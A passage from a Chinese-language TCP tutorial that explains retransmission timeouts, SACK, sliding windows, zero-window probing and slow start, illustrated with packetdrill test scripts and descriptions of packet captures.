SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0  4 +0 bind(3, ..., ...) = 0  5 +0 listen(3, 1) = 0  6  7 +0 \u0026lt; S 0:0(0) win 32792 \u0026lt;mss 1000,sackOK,nop,nop,nop,wscale 7\u0026gt;  8 +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt;  9 +.1 \u0026lt; . 1:1(0) ack 1 win 257  10  11 +0 accept(3, ... , ...) = 4  12 // 往客户端写 5000 字节数据  13 +0.1 write(4, ..., 5000) = 5000  14  15 +.1 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001,nop,nop\u0026gt;  // 三次重复 ack  16 +0 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001 2001:3001,nop,nop\u0026gt;  17 +0 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001 2001:4001,nop,nop\u0026gt;  18 +0 \u0026lt; . 1:1(0) ack 1001 win 257 \u0026lt;sack 1:1001 2001:5001,nop,nop\u0026gt;  19 // 回复确认包，让服务端不再重试  20 +.1 \u0026lt; . 1:1(0) ack 5001 win 257  21  22 +0 `sleep 1000000`   用 tcpdump 抓包以供 wireshark 分析sudo tcpdump -i any port 8080 -nn -A -w fast_retran.pcap，使用 packetdrill 执行上面的脚本。 可以看到，完全符合我们的预期，3 次重复 ACK 以后，过了15微妙，立刻进行了重传\n打开单个包的详情，在 ACK 包的 option 选项里，包含了 SACK 的信息，如下图：\n23、重传间隔有讲究 —— 多久重传才合适 看了前面的重传的文章，你可能有一个疑惑，到底隔多久重传才是合适的呢？间隔设置比较长，包丢了老半天了才重传，效率较低。间隔设置比较短，可能包并没有丢就重传，增加网络拥塞，可能导致更多的超时和重发。\n因此间隔多久重传就是不是一成不变的，它随着不同的网络情况需要动态的进行调整，这个值就是今天要介绍的「超时重传的时间」（Retransmission TimeOut，RTO），它与 RTT 密切相关，下面我们来介绍几种计算 RTO 的方法\n经典方法（适用 RTT 波动较小的情况） 一个最简单的想法就是取平均值，比如第一次 RTT 为 500ms，第二次 RTT 为 800ms，那么第三次发送时，各让一步取平均值 RTO 为 650ms。经典算法的思路跟取平均值是一样的，只不过系数不一样而已。\n经典算法引入了「平滑往返时间」（Smoothed round trip time，SRTT）的概念：经过平滑后的RTT的值，每测量一次 RTT 就对 SRTT 作一次更新计算\n1  SRTT = ( α * SRTT ) + ((1- α) * RTT)   α 是平滑因子，建议值是0.8 ~ 0.9。假设平滑因子 α = 0.8，那么 SRTT = 80% 的原始值 + 20% 的新采样值。相当于一个低通滤波器。\n 当 α 趋近于 1 时，1 - α 趋近于 0，SRTT 越接近上一次的 SRTT 值，与新的 RTT 值的关系越小，表现出来就是对短暂的时延变化越不敏感。 当 α 趋近于 0 时，1 - α 趋近于 1，SRTT 越接近新采样的 RTT 值，与旧的 SRTT 值关系越小，表现出来就是对时延变化更敏感，能够更快速的跟随时延的变化而变化  超时重传时间 RTO 的计算公式是：\n1  RTO = min(ubound, max(lbound, β * SRTT))   其中 β 是加权因子，一般推荐值为 1.3 ~ 2.0。ubound 为 RTO 的上界（upper bound），lbound 为 RTO 的下界（lower bound）。\n这个公式的含义其实就是，RTO 是一个 1.3 倍到 2.0 倍的 SRTT 值，最大不超过最大值 ubound，最小不小于最小值 lbound\n这个算法下，平滑因子 α 取值范围是 0.8 ~ 0.9，RTT 对 RTO 的影响太小了，在相对稳定RTT 的网络环境中，这个算法表现还可以，如果在一个 RTT 变化较大的环境中，则效果较差。\n于是出现了新的改进算法：标准方法。\n标准方法（Jacobson / Karels 算法） 传统方法最大的问题是RTT 有大的波动时，很难即时反应到 RTO 上，因为都被平滑掉了。标准方法对 RTT 的采样增加了一个新的因素，\n公式如下\n1 2 3  SRTT = (1 - α) * SRTT + α * RTT RTTVAR = (1 - β) * RTTVAR + β * (|RTT-SRTT|)  RTO= µ * SRTT + ∂ * RTTVar   先来看第一个计算 SRTT 的公式\n1  SRTT = (1 - α) * SRTT + α * RTT   这个公式与我们前面介绍的传统方法计算 SRTT 是一样的，都是新样本和旧值不同的比例权重共同构成了新的 SRTT 值，权重因子 α 的建议值是 0.125。在这种情况下， SRTT = 87.5% 的原始值 + 12.5% 的新采样值。\n第二个公式是计算 RTTVAR：「已平滑的 RTT 平均偏差估计器」（round-trip time variation，RTTVAR）\n1  RTTVAR = (1 - β) * RTTVAR + β * (|RTT-SRTT|)    平均偏差是标准方差的良好近似，计算较为容易，无需标准方差的求平方根运算。如果 β 取建议值 0.25 则\n1 2 3  RTTVAR  = 0.75 * RTTVAR + 0.25 * (|RTT-SRTT|) = 75% 的原始值 + 25% 的平滑 SRTT 与最新测量 RTT 的差值   第三个公式计算最终的 RTO 值\n1  RTO = µ * SRTT + ∂ * RTTVAR    μ 建议值取 1，∂ 建议值取 4，则\n1  RTO = SRTT + 4 * RTTVAR   这种算法下 RTO 与 RTT 变化的差值关系更密切，能对变化剧烈的 RTT做出更及时的调整。\n重传二义性与 Karn / Partridge 算法 前面的算法都很精妙，但是有一个最基本的问题还没解决，如何重传情况下计算 RTT，下面列举了三种常见的场景\n当客户收到重传过的某个请求的一个应答时，它不能区分该应答对应哪一次请求。\n 如果用第一次发送数据的时间和收到 ACK 的时间来算 RTT，就会出现图 1 和图 2 中的问题，RTT 时间明显是大于实际值 如果用第二次发送数据的时间和收到 ACK 的时间差值来算 RTT，就会出现图 3 中的问题，RTT 时间明显小于实际值  上面的这种问题，就称为「重传二义性」（retransmission ambiguity problem）\nKarn / Partridge 算法就是为了解决重传二义性的。它的思路也是很奇特，解决问题的最好办法就是不解决它：\n 既然不能确定 ACK 包到底对应重传包还是非重传包，那这次就忽略吧，这次重传的 RTT 不会被用来更新 SRTT 及后面的 RTO 只有当收到未重传过的某个请求的 ACK 包时，才更新 SRTT 等变量并重新计算RTO  仅仅有上面的规则是远远不够的，放弃掉重传那次不管看起来就像遇到危险把头埋在沙子里的鸵鸟。如果网络抖动，倒是突然出现大量重传，但这个时候 RTO 没有更新，就很坑了，本身 RTO 就是为了自适应网络延迟状况的，结果出问题了没有任何反应。这里 Karn 算法采用了出现重传就将 RTO 翻倍的方法，这就是我们前面看到过的指数级退避（Exponential backoff）。这种方式比较粗暴，但是非常简单。\n小结 这篇文章我们讲了 RTO 的由来和计算 RTO 的经典方法和标准方法的计算方式：\n 经典方法：适用 RTT 波动较小的情况 标准方法：对 RTT 波动较大的情况下有更好的适应效果  最后的部分引入了「重传二义性」的概念，看到了计算重传情况下 RTT 的困难之处，由此引入了 Karn 算法：\n 重传情况下不用测量的 RTT 来更新 SRTT 和 RTTVAR 出现重传时 RTO 采用指数级退避的方式，直到后续包出现不需要重传就可以收到确认为止  24、TCP流量控制 —— 滑动窗口 这篇文章我们来开始介绍 TCP 的滑动窗口。滑动窗口的一个非常重要的概念，是理解 TCP 精髓的关键，下面来开始这部分的内容吧。\n如果从 socket 的角度来看TCP，是下面这样的\nTCP 会把要发送的数据放入发送缓冲区（Send Buffer)，接收到的数据放入接收缓冲区（Receive Buffer），应用程序会不停的读取接收缓冲区的内容进行处理。\n流量控制做的事情就是，如果接收缓冲区已满，发送端应该停止发送数据。那发送端怎么知道接收端缓冲区是否已满呢？\n为了控制发送端的速率，接收端会告知客户端自己接收窗口（rwnd），也就是接收缓冲区中空闲的部分。\nTCP 在收到数据包回复的 ACK 包里会带上自己接收窗口的大小，接收端需要根据这个值调整自己的发送策略。\n发送窗口与接收窗口 一个非常容易混淆的概念是「发送窗口」和「接收窗口」，很多人会认为接收窗口就是发送窗口。\n先来问一个问题，wireshark 抓包中显示的 win=29312 指的是「发送窗口」的大小吗？\n当然不是的，其实这里的 win 表示向对方声明自己的接收窗口的大小，对方收到以后，会把自己的「发送窗口」限制在 29312 大小之内。如果自己的处理能力有限，导致自己的接收缓冲区满，接收窗口大小为 0，发送端应该停止发送数据。\nTCP 包状态分类 从 TCP 角度而言，数据包的状态可以分为如下图的四种\n 粉色部分#1 (Bytes Sent and Acknowledged)：表示已发送且已收到 ACK 确认的数据包。 蓝色部分#2 (Bytes Sent but Not Yet Acknowledged)：表示已发送但未收到 ACK 的数据包。发送方不确定这部分数据对端有没有收到，如果在一段时间内没有收到 ACK，发送端需要重传这部分数据包。 绿色部分#3 (Bytes Not Yet Sent for Which Recipient Is Ready)：表示未发送但接收端已经准备就绪可以接收的数据包（有空间可以接收） 黄色部分#4 (Bytes Not Yet Sent，Not Ready to Receive)：表示还未发送，且这部分接收端没有空间接收  发送窗口（send window）与可用窗口（usable window） 发送窗口是 TCP 滑动窗口的核心概念，它表示了在某个时刻一端能拥有的最大未确认的数据包大小（最大在途数据），发送窗口是发送端被允许发送的最大数据包大小，其大小等于上图中 #2 区域和 #3 区域加起来的总大小\n可用窗口是发送端还能发送的最大数据包大小，它等于发送窗口的大小减去在途数据包大小，是发送端还能发送的最大数据包大小，对应于上图中的 #3 号区域\n窗口的左边界表示成功发送并已经被接收方确认的最大字节序号，窗口的右边界是发送方当前可以发送的最大字节序号，滑动窗口的大小等于右边界减去左边界。\n如下图所示\n当上图中的可用区域的6个字节（46~51）发送出去，可用窗口区域减小到 0，这个时候除非收到接收端的 ACK 数据，否则发送端将不能发送数据。\n我们用 packetdrill 复现上面的现象\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  --tolerance_usecs=100000 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 // 禁用 nagle 算法 +0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0 +0 bind(3, ..., ...) = 0 +0 listen(3, 1) = 0  // 三次握手 +0 \u0026lt; S 0:0(0) win 20 \u0026lt;mss 1000\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; +.1 \u0026lt; . 1:1(0) ack 1 win 20 +0 accept(3, ..., ...) = 4  // 演示已经发送并 ACK 前 31 字节数据 +.1 write(4, ..., 15) = 15 +0 \u0026lt; . 1:1(0) ack 16 win 20 +.1 write(4, ..., 16) = 16 +0 \u0026lt; . 1:1(0) ack 32 win 20  +0 write(4, ..., 14) = 14 +0 write(4, ..., 6) = 6  +.1 \u0026lt; . 1:1(0) ack 52 win 20  +0 `sleep 1000000`   解析如下：\n 一开始我们禁用了 Nagle 算法以便后面可以连续发送包。 三次握手以后，客户端声明自己的窗口大小为 20 字节 通过两次发包和确认前 31 字节的数据 发送端发送(32,46)部分的 14 字节数据，滑动窗口的可用窗口变为 6 发送端发送(46,52)部分的 6 字节数据，滑动窗口的可用窗口变为 0，此时发送端不能往接收端发送任何数据了，除非有新的 ACK 到来 接收端确认(32,52)部分 20 字节的数据，可用窗口重现变为 20  滑动窗口变化过程如下：\n这个过程抓包的结果如下图：\n抓包显示的 TCP Window Full不是一个 TCP 的标记，而是 wireshark 智能帮忙分析出来的，表示包的发送方已经把对方所声明的接收窗口耗尽了，三次握手中客户端声明自己的接收窗口大小为 20，这意味着发送端最多只能给它发送 20 个字节的数据而无需确认，在途字节数最多只能为 20 个字节。\nTCP window full 我们用 packetdrill 再来模拟这种情况：三次握手中接收端告诉自己它的接收窗口为 4000，如果这个时候发送端发送 5000 个字节的数据，会发生什么呢？\n是会发送 5000 个字节出去，还是 4000 字节？\n脚本内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  --tolerance_usecs=100000 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 +0 bind(3, ..., ...) = 0 +0 listen(3, 1) = 0  // 三次握手告诉客户端告诉服务器自己的接收窗口大小为 4000 +0 \u0026lt; S 0:0(0) win 4000 \u0026lt;mss 1000\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; +.1 \u0026lt; . 1:1(0) ack 1 win 4000 +0 accept(3, ..., ...) = 4  // 写客户端写 5000 字节数据 +0 write(4, ..., 5000) = 5000  +0 `sleep 1000000`   抓包结果如下\n可以看到，因为 MSS 为 1000，每次发包的大小为 1000，总共发了 4 次以后在途数据包字节数为 4000，再发数据就会超过接收窗口的大小了，于是发送端暂停改了发送，等待在途数据包的确认。\n过程如下\nTCP Zero Window TCP 包中win=表示接收窗口的大小，表示接收端还有多少缓冲区可以接收数据，当窗口变成 0 时，表示接收端不能暂时不能再接收数据了。 我们来看一个实际的例子，如下图所示\n逐个解释一下\n一开始三次握手确定接收窗口大小为 360 字节。\n第一步：发送端发送 140 字节给接收端，此时因为 140 字节在途未确认，所以它的可用滑动窗口大小为：360 - 140 = 220\n第二步：接收端收到 140 字节以后，将这 140 字节放入TCP 接收区缓冲队列。\n正常情况下，接收端处理的速度非常快，这 140 字节会马上被应用层取走并释放这部分缓冲区，同时发送确认包给发送端，这样接收端的窗口大小（RCV.WND)马上可以恢复到 360 字节，发送端收到确认包以后也马上将可用发送滑动窗口恢复到 360 字节。\n但是如果因为高负载等原因，导致 TCP 没有立马处理接收到的数据包，收到的 140 字节没能全部被取走，这个时候 TCP 会在返回的 ACK 里携带它建议的接收窗口大小，因为自己的处理能力有限，那就告诉对方下次发少一点数据嘛。假设如上图的场景，收到了 140 字节数据，现在只能从缓冲区队列取走 40 字节，还剩下 100 字节留在缓冲队列中，接收端将接收窗口从原来的 360 减小 100 变为 260。\n第三步：发送端接收到 ACK 以后，根据接收端的指示，将自己的发送滑动窗口减小到 260。所有的数据都已经被确认，这时候可用窗口大小也等于 260\n第四步：发送端继续发送 180 字节的数据给接收端，可用窗口= 260 - 180 = 80。\n第五步：接收端收到 180 字节的数据，因为负载高等原因，没有能取走数据，将接收窗口再降低 180，变为 80，在回复给对端的 ACK 里携带回去。\n第六步：发送端收到 ACK 以后，将自己的发送窗口减小到 80，同时可用窗口也变为 80\n第七步：发送端继续发送 80 字节数据给接收端，在未确认之前在途字节数为 80，发送端可用窗口变为 0\n第八步：接收端收到 80 字节的数据，放入接收区缓冲队列，但是入之前原因，没能取走，滑动窗口进一步减小到 0，在回复的 ACK 里捎带回去\n第九步：发送端收到 ACK，根据发送端的指示，将自己的滑动窗口总大小减小为 0\n思考一个问题：现在发送端的滑动窗口变为 0 了，经过一段时间接收端从高负载中缓过来，可以处理更多的数据包，如果发送端不知道这个情况，它就会永远傻傻的等待了。于是乎，TCP 又设计了零窗口探测的机制（Zero window probe），用来向接收端探测，你的接收窗口变大了吗？我可以发数据了吗？\n零窗口探测包其实就是一个 ACK 包，下面根据抓包进行详细介绍\n我们用 packetdrill 来完美模拟上述的过程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  --tolerance_usecs=100000 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 +0 bind(3, ..., ...) = 0 +0 listen(3, 1) = 0  +0 \u0026lt; S 0:0(0) win 4000 \u0026lt;mss 1000\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; // 三次握手确定客户端接收窗口大小为 360 +.1 \u0026lt; . 1:1(0) ack 1 win 360 +0 accept(3, ..., ...) = 4  // 第一步：往客户端（接收端）写 140 字节数据 +0 write(4, ..., 140) = 140 // 第二步：模拟客户端回复 ACK，接收端滑动窗口减小为 260 +.01 \u0026lt; . 1:1(0) ack 141 win 260 // 第四步：服务端（发送端）接续发送 180 字节数据给客户端（接收端） +0 write(4, ..., 180) = 180 // 第五步：模拟客户端回复 ACK，接收端滑动窗口减小到 80 +.01 \u0026lt; . 1:1(0) ack 321 win 80 // 第七步：服务端（发送端）继续发送 80 字节给客户端（接收端） +0 write(4, ..., 80) = 80 // 第八步：模拟客户端回复 ACK，接收端滑动窗口减小到 0 +.01 \u0026lt; . 1:1(0) ack 401 win 0  // 这一步很重要，写多少数据没关系，一定要有待发送的数据。如果没有待发的数据，不会进行零窗口探测 // 这 100 字节数据实际上不会发出去 +0 write(4, ..., 100) = 100   +0 `sleep 1000000`   抓包结果如下：\n可以看到\n No = 8 的包，发送端发送 80 以后，自己已经把接收端声明的接收窗口大小耗尽了，wireshark 帮我们把这种行为识别为了 TCP Window Full。 No = 9 的包，是接收端回复的 ACK，携带了 win=0，wireshark 帮忙把这个包标记为了 TCP Zero window No = 10 ~ 25 的包就是我们前面提到的TCP Zero Window Probe，但是 wireshark 这里识别这个包为了 Keep-Alive，之所以被识别为Keep-Alive 是因为这个包跟 Keep-Alive 包很像。这个包的特点是：一个长度为 0 的 ACK 包，Seq 为当前连接 Seq 最大值减一。因为发出的探测包一直没有得到回应，所以会一直发送端会一直重试。重试的策略跟前面介绍的超时重传的机制一样，时间间隔遵循指数级退避，最大时间间隔为 120s，重试了 16，总共花费了 16 分钟  有等待重试的地方就有攻击的可能 与之前介绍的 Syn Flood 攻击类似，上面的零窗口探测也会成为攻击的对象。试想一下，一个客户端利用服务器上现有的大文件，向服务器发起下载文件的请求，在接收少量几个字节以后把自己的 window 设置为 0，不再接收文件，服务端就会开始漫长的十几分钟时间的零窗口探测，如果有大量的客户端对服务端执行这种攻击操作，那么服务端资源很快就被消耗殆尽。\nTCP window full 与 TCP zero window 这两者都是发送速率控制的手段，\n TCP Window Full 是站在发送端角度说的，表示在途字节数等于对方接收窗口的情况，此时发送端不能再发数据给对方直到发送的数据包得到 ACK。 TCP zero window 是站在接收端角度来说的，是接收端接收窗口满，告知对方不能再发送数据给自己。  作业题 1、关于 TCP 的滑动窗口,下面哪些描述是错误的?\n A、发送端不需要传输完整的窗口大小的报文 B、TCP 滑动窗口允许在收到确认之前发送多个数据包 C、重传计时器超时后,发送端还没有收到确认，会重传未被确认的数据 D、发送端不宣告初始窗口大小  2、TCP使用滑动窗口进行流量控制，流量控制实际上是对（ ）的控制。\n A、发送方数据流量 B、接收方数据流量 C、发送、接收方数据流量 D、链路上任意两节点间的数据流量  25、有风度的 TCP —— 拥塞控制 前面的文章介绍了 TCP 利用滑动窗口来做流量控制，但流量控制这种机制确实可以防止发送端向接收端过多的发送数据，但是它只关注了发送端和接收端自身的状况，而没有考虑整个网络的通信状况。于是出现了我们今天要讲的拥塞处理。\n拥塞处理主要涉及到下面这几个算法\n 慢启动（Slow Start） 拥塞避免（Congestion Avoidance） 快速重传（Fast Retransmit）和快速恢复（Fast Recovery）  为了实现上面的算法，TCP 的每条连接都有两个核心状态值：\n 拥塞窗口（Congestion Window，cwnd） 慢启动阈值（Slow Start Threshold，ssthresh）  拥塞窗口（Congestion Window，cwnd） 拥塞窗口指的是在收到对端 ACK 之前自己还能传输的最大 MSS 段数。\n它与前面介绍的接收窗口（rwnd）有什么区别呢？\n 接收窗口（rwnd）是接收端的限制，是接收端还能接收的数据量大小 拥塞窗口（cwnd）是发送端的限制，是发送端在还未收到对端 ACK 之前还能发送的数据量大小  我们在 TCP 头部看到的 window 字段其实讲的接收窗口（rwnd）大小。\n拥塞窗口初始值等于操作系统的一个变量 initcwnd，最新的 linux 系统 initcwnd 默认值等于 10。\n拥塞窗口与前面介绍的发送窗口（Send Window）又有什么关系呢？\n真正的发送窗口大小 = 「接收端接收窗口大小」 与 「发送端自己拥塞窗口大小」 两者的最小值\n如果接收窗口比拥塞窗口小，表示接收端处理能力不够。如果拥塞窗口小于接收窗口，表示接收端处理能力 ok，但网络拥塞。\n这也很好理解，发送端能发送多少数据，取决于两个因素\n 对方能接收多少数据（接收窗口） 自己为了避免网络拥塞主动控制不要发送过多的数据（拥塞窗口）  发送端和接收端不会交换 cwnd 这个值，这个值是维护在发送端本地内存中的一个值，发送端和接收端最大的在途字节数（未经确认的）数据包大小只能是 rwnd 和 cwnd 的最小值。\n拥塞控制的算法的本质是控制拥塞窗口（cwnd）的变化。\n 拥塞处理算法一：慢启动 在连接建立之初，应该发多少数据给接收端才是合适的呢？\n你不知道对端有多快，如果有足够的带宽，你可以选择用最快的速度传输数据，但是如果是一个缓慢的移动网络呢？如果发送的数据过多，只是造成更大的网络延迟。这是基于整个考虑，每个 TCP 连接都有一个拥塞窗口的限制，最初这个值很小，随着时间的推移，每次发送的数据量如果在不丢包的情况下，“慢慢”的递增，这种机制被称为「慢启动」\n拥塞控制是从整个网络的大局观来思考的，如果没有拥塞控制，某一时刻网络的时延增加、丢包频繁，发送端疯狂重传，会造成网络更重的负担，而更重的负担会造成更多的时延和丢包，形成雪崩的网络风暴。\n这个算法的过程如下：\n 第一步，三次握手以后，双方通过 ACK 告诉了对方自己的接收窗口（rwnd）的大小，之后就可以互相发数据了 第二步，通信双方各自初始化自己的「拥塞窗口」（Congestion Window，cwnd）大小。 第三步，cwnd 初始值较小时，每收到一个 ACK，cwnd + 1，每经过一个 RTT，cwnd 变为之前的两倍。 过程如下图   在初始拥塞窗口为 10 的情况下，拥塞窗口随时间的变化关系如下图\n因此可以得到拥塞窗口达到 N 所花费的时间公式为： 假设 RTT 为 50ms，客户端和服务端的接收窗口为65535字节（64KB），初始拥塞窗口为：10段，那么要达到 64KB 的吞吐量，拥塞窗口的段数 = 65535 / 1460 = 45 段，需要的 RTT 次数 = log2（45 / 10）= 2.12 次，需要的时间 = 50 * 2.12 = 106ms。也就是客户端和服务器之间的 64KB 的吞吐量，需要 2.12 次 RTT，100ms 左右的延迟。\n早期的 Linux 的初始 cwnd 为 4，在这种情况下，需要 3.35 次 RTT，花费的实际就更长了。如果客户端和服务器之间的 RTT 很小，则这个时间基本可以忽略不计\n使用 packetdrill 来演示慢启动的过程 我们用 packetdrill 脚本的方式来看慢启动的过程。模拟服务端 8080 端口往客户端传送 100000 字节的数据，客户端的 MSS 大小为 100。\n1  +0 write(4, ..., 100000) = 100000   packetdrill 脚本内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  --tolerance_usecs=1000000 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3 +0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0 +0 bind(3, ..., ...) = 0 +0 listen(3, 1) = 0  +0 \u0026lt; S 0:0(0) win 65535 \u0026lt;mss 100\u0026gt; +0 \u0026gt; S. 0:0(0) ack 1 \u0026lt;...\u0026gt; +.1 \u0026lt; . 1:1(0) ack 1 win 65535  +.1 accept(3, ..., ...) = 4  // 往客户端写 20000 字节数据 +.3 write(4, ..., 20000) = 20000 // 预期内核会发出 10 段 MSS 数据，下面是 10 次断言 +0 \u0026gt; . 1:101(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 101:201(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 201:301(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 301:401(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 401:501(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 501:601(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 601:701(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 701:801(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 801:901(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 901:1001(100) ack 1 \u0026lt;...\u0026gt;  +0 `sleep 1000000`   第 1 步：首先通过抓包确定，是不是符合我们的预期，拥塞窗口 cwnd 为 10 ，第一次会发 10 段 MSS 的数据包，抓包结果如下。\n可以看到服务器一口气发了 10 段数据，然后等待客户端回复 ACK，因为我们没有写回复ACK 的代码，所以过了 300ms 以后开始重传了。\n第 2 步：确认这 10 段数据 在 write 调用后面增加确认 10 个段数据的脚本。理论上拥塞窗口 cwnd 会从 10 变为 20，预期内核会发出 20 段数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  +.1 \u0026lt; . 1:1(0) ack 1001 win 65535 // 预期会发出 20 段 MSS，下面是 20 次断言 +0 \u0026gt; . 1001:1101(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1101:1201(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1201:1301(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1301:1401(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1401:1501(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1501:1601(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1601:1701(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1701:1801(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1801:1901(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 1901:2001(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2001:2101(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2101:2201(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2201:2301(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2301:2401(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2401:2501(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2501:2601(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2601:2701(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2701:2801(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2801:2901(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 2901:3001(100) ack 1 \u0026lt;...\u0026gt;   重新执行抓包，可以看到这次服务端发送了 20 段长度为 MSS 的数据 第 3 步：确认发送的 20 段数据 再确认发送的 20 段数据，看看内核会发送出多少数据\n1 2 3 4 5 6 7 8 9 10  // 确认这 20 段数据 +.2 \u0026lt; . 1:1(0) ack 3001 win 65535  // 预期会发出 40 段 MSS 数据，下面是 40 次断言 +0 \u0026gt; . 3001:3101(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 3101:3201(100) ack 1 \u0026lt;...\u0026gt; // 中间省略若干行 +0 \u0026gt; . 6701:6801(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 6801:6901(100) ack 1 \u0026lt;...\u0026gt; +0 \u0026gt; . 6901:7001(100) ack 1 \u0026lt;...\u0026gt;   抓包结果如下，可以看到这下服务器发送了 40 段数据 第 4 步，确认发送的 40 段数据，理论上应该会发送 80 段数据，包序号区间：7001 ~ 15001\n1  +.2 \u0026lt; . 1:1(0) ack 7001 win 65535   抓包结果如下 上面的过程通过抓包的方式来验证了慢启动指数级增大拥塞窗口 cwnd 的过程。\n慢启动阈值（Slow Start Threshold，ssthresh） 慢启动拥塞窗口（cwnd）肯定不能无止境的指数级增长下去，否则拥塞控制就变成了「拥塞失控」了，它的阈值称为「慢启动阈值」（Slow Start Threshold，ssthresh），这是文章开头介绍的拥塞控制的第二个核心状态值。ssthresh 就是一道刹车，让拥塞窗口别涨那么快。\n 当 cwnd \u0026lt; ssthresh 时，拥塞窗口按指数级增长（慢启动） 当 cwnd \u0026gt; ssthresh 时，拥塞窗口按线性增长（拥塞避免）  拥塞避免（Congestion Avoidance） 当 cwnd \u0026gt; ssthresh 时，拥塞窗口进入「拥塞避免」阶段，在这个阶段，每一个往返 RTT，拥塞窗口大约增加 1 个 MSS 大小，直到检测到拥塞为止。\n与慢启动的区别在于\n 慢启动的做法是 RTT 时间内每收到一个 ACK，拥塞窗口 cwnd 就加 1，也就是每经过 1 个 RTT，cwnd 翻倍 拥塞避免的做法保守的多，每经过一个RTT 才将拥塞窗口加 1，不管期间收到多少个 ACK  实际的算法是如下：，\n 每收到一个 ACK，将拥塞窗口增加一点点（1 / cwnd）：cwnd += 1 / cwnd   以初始 cwnd = 1 为例，cwnd 变化的过程如下图\n所以是每经过 1 个 RTT，拥塞窗口「大约」增加 1\n 前面介绍的慢启动和拥塞避免是 1988 年提出的拥塞控制方案，在 1990 年又出现了两种新的拥塞控制方案：「快速重传」和「快速恢复」\n算法三：快速重传（Fast Retransmit) 之前重传的文章中我们介绍重传的时间间隔，要等几百毫秒才会进行第一次重传。聪明的网络协议设计者们想到了一种方法：「快速重传」\n快速重传的含义是：当接收端收到一个不按序到达的数据段时，TCP 立刻发送 1 个重复 ACK，而不用等有数据捎带确认，当发送端收到 3 个或以上重复 ACK，就意识到之前发的包可能丢了，于是马上进行重传，不用傻傻的等到重传定时器超时再重传。\n选择确认（Selective Acknowledgment，SACK） 这个有一个问题，发送 3、4、5 包收到的全部是 ACK=1001，快速重传解决了一个问题: 需要重传。因为除了 2 号包，3、4、5 包也有可能丢失，那到底是只重传数据包 2 还是重传 2、3、4、5 所有包呢？\n聪明的网络协议设计者，想到了一个好办法\n 收到 3 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:3001] 区间的包我也收到了 收到 4 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:4001] 区间的包我也收到了 收到 5 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 1000（ACK=1001），[1:1001]、[2001:5001] 区间的包我也收到了  这样发送端就清楚知道只用重传 2 号数据包就可以了，数据包 3、4、5已经确认无误被对端收到。这种方式被称为 SACK（Selective Acknowledgment）。\n如下图所示： 使用 packetdrill 演示快速重传 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24   1 --tolerance_usecs=100000  // 常规操作：初始化  2 0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3  3 